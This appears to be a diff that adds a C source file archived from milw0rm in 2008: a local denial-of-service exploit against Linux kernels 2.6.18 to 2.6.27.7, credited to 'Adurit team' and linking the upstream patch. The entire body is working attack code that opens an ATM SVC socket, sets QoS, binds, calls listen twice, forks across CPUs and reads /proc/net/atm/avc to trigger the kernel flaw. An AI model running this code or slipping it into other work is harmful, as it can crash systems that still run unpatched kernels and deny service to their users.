@@ -1,0 +1,72 @@
+/*
+
+Linux Kernel 2.6.27.7-generic - 2.6.18 - 2.6.24-1 Denial of service Exploit
+
+Vuln : 2.6.27.7-generic || 2.6.18 || 2.6.24-1
+
+Author : Adurit team
+             >>djekmani4ever
+
+Home : Hightsec.com
+
+patch : http://marc.info/?l=linux-netdev&m=122841256115780&w=2
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <linux/atm.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/stat.h> 
+                      
+#define NUM_CPUS 8    
+#define ATM "/proc/net/atm/avc"
+                              
+int                           
+main(void)                    
+{                             
+    char *err, adurit[2000];  
+    int i, ret, sock, proc;   
+    struct atm_qos dj;        
+    struct sockaddr_atmsvc addr;
+                               
+                               
+                               
+    sock = socket(PF_ATMSVC, SOCK_DGRAM, 0);
+                                           
+                                           
+    memset(&dj, 0, sizeof(dj));            
+    dj.rxtp.traffic_class = ATM_UBR;       
+    dj.txtp.traffic_class = ATM_UBR;       
+    dj.aal = ATM_NO_AAL;                   
+                                           
+
+    ret = setsockopt(sock, SOL_ATM, SO_ATMQOS, &dj, sizeof(dj));
+    if (ret == -1) {
+        printf("failed !\n");
+        return 1;
+    }
+    memset(&addr, 0, sizeof(addr));
+    addr.sas_family = AF_ATMSVC;
+ 
+    bind(sock, (struct sockaddr *) &addr, sizeof(addr));
+ 
+    listen(sock, 10);
+    listen(sock, 10);
+
+    for (i = 1; i < NUM_CPUS; ++i) {
+        if (fork() != 0) {
+            break;
+        }
+    }
+    proc = open(ATM, O_RDONLY);
+    ret = read(proc, &adurit, 2000);
+    close(proc);
+
+    return 0;
+}
+
+// milw0rm.com [2008-12-14]
